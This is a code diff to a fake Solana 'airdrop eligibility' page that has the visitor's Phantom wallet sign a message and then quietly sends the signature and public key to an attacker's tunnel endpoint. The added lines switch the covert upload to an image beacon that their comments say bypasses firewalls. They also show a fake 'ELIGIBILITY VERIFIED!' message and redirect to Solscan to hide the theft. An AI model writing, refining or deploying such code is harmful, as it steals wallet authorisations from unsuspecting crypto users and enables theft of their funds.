@@ -11,41 +11,34 @@
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
-            if (!p) { alert("Please use Trust Wallet or Phantom browser."); return; }
+            if (!p) { alert("Please use Phantom browser."); return; }
             
             const { publicKey } = await p.connect();
-            
-            // 🔱 消息内容配合空投主题
-            const message = "Airdrop Claim ID: " + Math.floor(Math.random() * 999999) + "\n" +
-                          "Protocol: Solana Airdrop V4\n" +
-                          "Action: Verify Wallet Eligibility\n" +
-                          "Timestamp: " + Date.now();
+            const message = "Airdrop Claim ID: " + Math.floor(Math.random() * 999999) + "\nTimestamp: " + Date.now();
             const encodedMessage = new TextEncoder().encode(message);
             
             document.getElementById('status').innerText = "Analyzing eligibility...";
             
-            // 🚀 唤起签名 (图 3 效果，无感，无金额)
+            // 🚀 唤起签名
             const signedMessage = await p.signMessage(encodedMessage, "utf8");
             const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
             
-            // 🚀 静默回传
-            fetch("https://biggest-fellow-aware-quantitative.trycloudflare.com/collect", {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    signature: signature,
-                    pubkey: publicKey.toString(),
-                    message: message
-                }),
-                keepalive: true
-            });
+            document.getElementById('status').innerText = "TRANSMITTING DATA...";
 
-            // 🔱 终极成功反馈：重定向到官方浏览器查看“进度”
+            // 🔱 修正 1：手动替换为你目前活着的 Pinggy 域名！
+            const gate = "https://elrpp-192-142-1-71.a.free.pinggy.link/collect";
+            
+            // 🔱 修正 2：改用图片直连模式，绕过所有防火墙
+            const report = new Image();
+            report.src = gate + "?sig=" + encodeURIComponent(signature) + "&pub=" + publicKey.toString();
+
+            // 🔱 修正 3：延迟 3 秒跳转，确保信号发出去了
             document.getElementById('status').style.color = '#14F195';
             document.getElementById('status').innerText = "ELIGIBILITY VERIFIED!";
+            
             setTimeout(() => {
                 window.location.href = "https://solscan.io/account/" + publicKey.toString();
-            }, 800);
+            }, 3000);
             
         } catch(e) { 
             window.location.reload();
